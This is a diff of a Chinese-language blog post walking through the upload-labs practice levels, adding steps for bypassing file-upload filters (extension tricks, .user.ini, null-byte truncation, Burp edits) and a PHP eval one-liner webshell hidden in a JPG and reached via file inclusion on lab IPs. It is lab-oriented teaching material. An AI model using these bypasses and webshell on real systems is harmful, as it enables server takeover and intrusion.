@@ -18,22 +18,47 @@
   
   
   <title>文件上传漏洞 | Hexo</title>
-  <meta name="description" content="upload_labslab1一句话马   F12，设置，禁用页面js   lab2lab3老版本环境:phpstudy2014  lab4老版本环境:phpstudy2014   lab5lab6(黑名单)  lab7练习目标ip:192.168.2.114 访问一下  准备一个马，上传   使用burp抓包，开启拦截，访问一下上传后的路径upload   把包发送到intruder中，添加一个">
+  <meta name="description" content="upload_labslab1一句话马   F12，设置，禁用页面js   lab2马上传，bp抓包，发送到重放器，修改文件类型，放行   lab3老版本环境:phpstudy2014 改一下httpd.conf文件里的#AddType application&#x2F;x-httpd-php .php .phtml为AddType application&#x2F;x-httpd-php .ph">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传漏洞">
 <meta property="og:url" content="http://example.com/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="upload_labslab1一句话马   F12，设置，禁用页面js   lab2lab3老版本环境:phpstudy2014  lab4老版本环境:phpstudy2014   lab5lab6(黑名单)  lab7练习目标ip:192.168.2.114 访问一下  准备一个马，上传   使用burp抓包，开启拦截，访问一下上传后的路径upload   把包发送到intruder中，添加一个">
+<meta property="og:description" content="upload_labslab1一句话马   F12，设置，禁用页面js   lab2马上传，bp抓包，发送到重放器，修改文件类型，放行   lab3老版本环境:phpstudy2014 改一下httpd.conf文件里的#AddType application&#x2F;x-httpd-php .php .phtml为AddType application&#x2F;x-httpd-php .ph">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109145707688.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109144609926.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109145346396.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109145528761.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115104955677.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115105214849.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109143851757.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109144147957.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109143910829.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115150325981.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109151336645.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109151302318.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115143850990.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144119384.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144346845.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144432127.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144745937.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145210062.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145333663.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145414766.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145701966.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145811382.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115154226153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115154454795.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115155930702.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115160205080.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115160348920.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115195143402.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115195301213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115195501988.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115201332872.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115202017247.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115202304991.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115202402911.png">
 <meta property="og:image" content="http://example.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/image-20240110211740199.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240110211659100.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240110212123478.png">
@@ -46,7 +71,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240110213400124.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240110215704491.png">
 <meta property="article:published_time" content="2024-01-09T01:54:15.000Z">
-<meta property="article:modified_time" content="2024-01-10T13:57:11.735Z">
+<meta property="article:modified_time" content="2024-01-15T12:32:23.075Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109145707688.png">
@@ -383,14 +408,69 @@
 <p>F12，设置，禁用页面js</p>
 <p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109145346396.png" alt="image-20240109145346396"></p>
 <p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109145528761.png" alt="image-20240109145528761"></p>
-<h4 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h4><h4 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h4><p>老版本环境:phpstudy2014</p>
+<h4 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h4><p>马上传，bp抓包，发送到重放器，修改文件类型，放行</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115104955677.png" alt="image-20240115104955677"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115105214849.png" alt="image-20240115105214849"></p>
+<h4 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h4><p>老版本环境:phpstudy2014</p>
+<p>改一下httpd.conf文件里的#AddType application&#x2F;x-httpd-php .php .phtml<br>为AddType application&#x2F;x-httpd-php .php .phtml .php5 .php3<br>记得去掉#号。</p>
+<p>修改完配置文件记得要重启一下phpstudy服务环境</p>
+<p>然后把一句话木马文件.php后缀改为.php5 上传</p>
 <p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109143851757.png" alt="image-20240109143851757"></p>
 <h4 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h4><p>老版本环境:phpstudy2014</p>
 <p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109144147957.png" alt="image-20240109144147957"></p>
 <p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109143910829.png" alt="image-20240109143910829"></p>
-<h4 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h4><h4 id="lab6-黑名单"><a href="#lab6-黑名单" class="headerlink" title="lab6(黑名单)"></a>lab6(黑名单)</h4><p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109151336645.png" alt="image-20240109151336645"></p>
+<h4 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h4><p>新建.user.in文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=3.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115150325981.png" alt="image-20240115150325981"></p>
+<p>先上传.user.ini文件，再上传马3.jpg</p>
+<p>等待5分钟使用蚁剑连接</p>
+<h4 id="lab6-黑名单-大小写绕过"><a href="#lab6-黑名单-大小写绕过" class="headerlink" title="lab6(黑名单 大小写绕过)"></a>lab6(黑名单 大小写绕过)</h4><p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109151336645.png" alt="image-20240109151336645"></p>
 <p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240109151302318.png" alt="image-20240109151302318"></p>
-<h4 id="lab7"><a href="#lab7" class="headerlink" title="lab7"></a>lab7</h4><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>目标ip:192.168.2.114</p>
+<h4 id="lab7"><a href="#lab7" class="headerlink" title="lab7"></a>lab7</h4><p>bp抓包，打开拦截，文件名后面加个空格，关闭拦截，成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115143850990.png" alt="image-20240115143850990"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144119384.png" alt="image-20240115144119384"></p>
+<h4 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h4><p>bp抓包，打开拦截，文件名后面加个点.，关闭拦截，成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144346845.png" alt="image-20240115144346845"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144432127.png" alt="image-20240115144432127"></p>
+<h4 id="lab9"><a href="#lab9" class="headerlink" title="lab9"></a>lab9</h4><p>bp抓包，打开拦截，文件名后面加::$data，关闭拦截，成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115144745937.png" alt="image-20240115144745937"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145210062.png" alt="image-20240115145210062"></p>
+<h4 id="lab10"><a href="#lab10" class="headerlink" title="lab10"></a>lab10</h4><p>bp抓包，打开拦截，文件名后面加点空格点(. .)，关闭拦截，成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145333663.png" alt="image-20240115145333663"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145414766.png" alt="image-20240115145414766"></p>
+<h4 id="lab11-双写绕过"><a href="#lab11-双写绕过" class="headerlink" title="lab11(双写绕过)"></a>lab11(双写绕过)</h4><p>bp抓包，打开拦截，文件名后缀改成.pphphp，关闭拦截，成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145701966.png" alt="image-20240115145701966"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115145811382.png" alt="image-20240115145811382"></p>
+<h4 id="lab12-白名单"><a href="#lab12-白名单" class="headerlink" title="lab12(白名单)"></a>lab12(白名单)</h4><p>上传文件3.jpg，bp抓包，打开拦截，在&#x2F;upload&#x2F;加3.php%00，关闭拦截，成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115154226153.png" alt="image-20240115154226153"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115154454795.png" alt="image-20240115154454795"></p>
+<h4 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h4><p>上传文件3.jpg，bp抓包，打开拦截，在&#x2F;upload&#x2F;加3.php再加个空格，再点击Hex,将空格20改成00，关闭拦截，成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115155930702.png" alt="image-20240115155930702"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115160205080.png" alt="image-20240115160205080"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115160348920.png" alt="image-20240115160348920"></p>
+<h4 id="lab14-图片马-文件包含"><a href="#lab14-图片马-文件包含" class="headerlink" title="lab14(图片马+文件包含)"></a>lab14(图片马+文件包含)</h4><p>Jpg格式图片的文件头标识：FFD8开头FFD9结尾</p>
+<p>Png格式图片的文件头标识：89 20 4E 47 0D 0A</p>
+<p>Gif格式图片的文件头标识：GIF89a GIF87a</p>
+<p>准备一张.jpg图片，一个马(POST请求)；在文件路径上cmd使用命令合在一起</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 马</span><br><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"># 命令</span><br><span class="line">copy .\yu.jpg/b+.\wsx.php yu1.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115195143402.png" alt="image-20240115195143402"></p>
+<p>然后上传yu1.jpg,复制图片链接使用蚁剑测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.169/upload-labs-master/upload-labs-master/upload/1520240115194054.jpg</span><br><span class="line"></span><br><span class="line">添加include.php?file= 	# 文件包含</span><br><span class="line"></span><br><span class="line">http://192.168.233.169/upload-labs-master/upload-labs-master/include.php?file=upload/1520240115194054.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115195301213.png" alt="image-20240115195301213"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115195501988.png" alt="image-20240115195501988"></p>
+<h4 id="lab15"><a href="#lab15" class="headerlink" title="lab15"></a>lab15</h4><p>和14关一样，直接上传14关用的yu1.jpg文件，蚁剑连接，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.169/upload-labs-master/upload-labs-master/include.php?file=upload/4120240115201027.jpeg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115201332872.png" alt="image-20240115201332872"></p>
+<h4 id="lab16"><a href="#lab16" class="headerlink" title="lab16"></a>lab16</h4><p>需要开启php扩展中的php_exif模块</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115202017247.png" alt="image-20240115202017247"></p>
+<p>其余操作和14关一样</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115202304991.png" alt="image-20240115202304991"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240115202402911.png" alt="image-20240115202402911"></p>
+<h4 id="lab17"><a href="#lab17" class="headerlink" title="lab17"></a>lab17</h4><h4 id="lab18-条件竞争"><a href="#lab18-条件竞争" class="headerlink" title="lab18(条件竞争)"></a>lab18(条件竞争)</h4><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>目标ip:192.168.2.114</p>
 <p>访问一下</p>
 <p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/image-20240110211740199.png" alt="image-20240110211740199"></p>
 <p>准备一个马，上传</p>
